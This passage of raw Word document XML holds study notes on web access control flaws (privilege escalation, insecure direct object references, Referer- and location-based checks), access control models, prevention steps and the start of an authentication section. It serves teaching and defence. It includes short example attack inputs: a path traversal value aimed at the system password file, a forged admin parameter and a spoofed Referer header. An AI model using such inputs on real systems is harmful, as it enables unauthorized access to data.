          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>admin=true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on a request).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Platform misconfigura</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>tion</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: allow access to protected resources via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>unexecpted</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> HTTP methods (e.g. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead of an expected </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Horizontal access control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">Allow access to a subset of the same type of resources to users (a user can only access their own </w:t>
      </w:r>
      <w:r>
        <w:t>account profile page, but not other user's account profiles).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Horizontal privilege escalation</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>When a user gains access to another user's data or resources.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">This can often be turned into a vertical privilege escalation by compromising a more </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>priveleged</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and then using that user to grant access to the attacker's account or create another privileged user account controlled by the attacker.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Insecure director object reference</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>When an attacker can directly access objects through input they supply.  This can i</w:t>
      </w:r>
      <w:r>
        <w:t>nclude:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Direct access to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>databaes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> objects through a user-supplied ID (e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>id=1</w:t>
      </w:r>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Direct access to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> objects by altering the URL (e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>imageUrl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>=../../../</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>ect</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>passwd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Context-dependent access control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Allow access to resources/actions based on som</w:t>
      </w:r>
      <w:r>
        <w:t>e state (a user cannot remove items from their shopping cart after the checkout process has started).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Access control vulnerabilities in multi-step processes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">When a user is able to bypass sections of a multi-step process, which can occur </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>whena</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> access contro</w:t>
      </w:r>
      <w:r>
        <w:t>ls are not applied consistently to all steps.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> based access control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">When an application relies on the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> HTTP header to enforce access control.  Since this can be altered in the request, it allows for access control bypass.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">An example could be </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">if a page like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>/admin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>deleteUser</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> only checks for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Referer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>=admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to perform access validation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>Location based access control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t xml:space="preserve">When </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> application relies on geolocation IP lookup to enforce access control.  This can be circumvented with a VPN.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Access control m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>odels</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Programatic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t xml:space="preserve"> access control</w:t>
      </w:r>
      <w:r>
        <w:t>: matrix of stored permissions that can be applied to users, groups or roles.  Permissions are applied before actions or access is performed to determine if it is allowed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Discretional access control (DAC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: users or groups are given access to resources and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> grant access to other users/groups.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Mandatory access control (MAC)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: users or groups are given access to resources and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>cannot</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> grant access to other users/groups.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Role-based access control (RBAC)</w:t>
      </w:r>
      <w:r>
        <w:t>: users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are assigned roles which are given access to resources.  A user can have multiple roles.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Deny access by default to all resources.  Implement an allow-list for resources that are accessible.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use a single access control model for the entire applicat</w:t>
      </w:r>
      <w:r>
        <w:t>ion to prevent confusion.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Have developers thoroughly declare all access requirements for each resource.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Do not rely on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>obfustication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or hiding of resources to prevent access.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Rigorously test access control for all resources and actions, ideally using autom</w:t>
      </w:r>
      <w:r>
        <w:t>ation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tools</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Intruder</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Proxy</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:hyperlink r:id="rId26" w:history="1">
        <w:r>
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Burp Repeater</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/access-control</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-security/access-control/idor</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:sectPr w:rsidR="00B3581B">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="1"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>https://portswigger.net/web-</w:t>
      </w:r>
      <w:r>
        <w:t>security/access-control/security-models</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Authentication :unlock</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:r>
        <w:t>Vulnerabilities around logging into an application (proving your identity to that app).  Generally fall into two categories:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login susceptible to brute force attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Authentication can by byp</w:t>
      </w:r>
      <w:r>
        <w:t>assed entirely (broken authentication).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Prevent</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Safeguard credentials</w:t>
      </w:r>
      <w:r>
        <w:t>: strong encryption and password hashing.  Never pass or store credentials in plain text.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Multi-factor authentication</w:t>
      </w:r>
      <w:r>
        <w:t>: something you know (password), something you have (phone/token), and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> something you are (biometrics).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
        <w:t>Rate limiting, account locking and CAPTCHA</w:t>
      </w:r>
      <w:r>
        <w:t>: prevent brute force attacks.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3581B" w:rsidRDefault="003F20FB">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="C7254E"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="white"/>
        </w:rPr>
